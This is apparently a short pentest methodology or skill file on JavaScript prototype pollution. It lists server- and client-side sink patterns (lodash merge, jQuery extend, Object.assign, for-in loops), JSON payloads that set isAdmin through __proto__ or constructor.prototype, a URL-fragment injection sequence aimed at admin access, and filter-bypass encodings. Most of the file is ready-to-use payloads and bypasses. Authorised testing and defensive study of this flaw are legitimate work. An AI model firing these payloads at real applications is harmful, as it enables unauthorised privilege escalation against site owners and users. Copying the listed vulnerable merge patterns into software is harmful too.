---
name: prototype-pollution
description: Client-side prototype pollution — __proto__, constructor, Object.assign sinks, DOM clobbering, and filter bypasses
category: vulnerabilities
---

# Prototype Pollution Methodology

## What It Is
Prototype pollution occurs when an attacker controls properties assigned to `Object.prototype` in JavaScript, affecting all objects in the runtime.

## Sink Detection (Server-Side)
```
app.get("/", (req, res) => {
  _.merge(req.query, config);           // lodash merge
  Object.assign(config, req.body);       // Object.assign
  for (let k in req.body) config[k] = req.body[k];  // for-in loop
  app.set("view options", req.body);     // express merges
})
```

## Sink Detection (Client-Side)
```javascript
// Vulnerable patterns:
$.extend(true, {}, JSON.parse(input))     // jQuery
_.merge({}, JSON.parse(input))            // Lodash
Object.assign({}, JSON.parse(input))      // Native
for (let k in input) target[k] = input[k] // For-in assignment

// Exploitation:
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
```

## Detection Payloads
```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"__proto__":{"polluted":"true"}}  → check if Object.prototype.polluted exists
```

## Client-Side DOM Exploitation
1. Find script that parses URL params/hash via `JSON.parse()` or `$.extend()`
2. Inject `#__proto__[isAdmin]=true` in URL fragment
3. If app merges URL params into objects → admin access

## Filter Bypasses
```
__proto__  →  __pro__proto__to__  (double proto)
constructor.prototype  →  construcTOR.prototype  (mixed case)
__proto__  →  ["__proto__"]  (bracket notation)
__proto__  →  \u005f\u005fproto\u005f\u005f  (unicode)
```
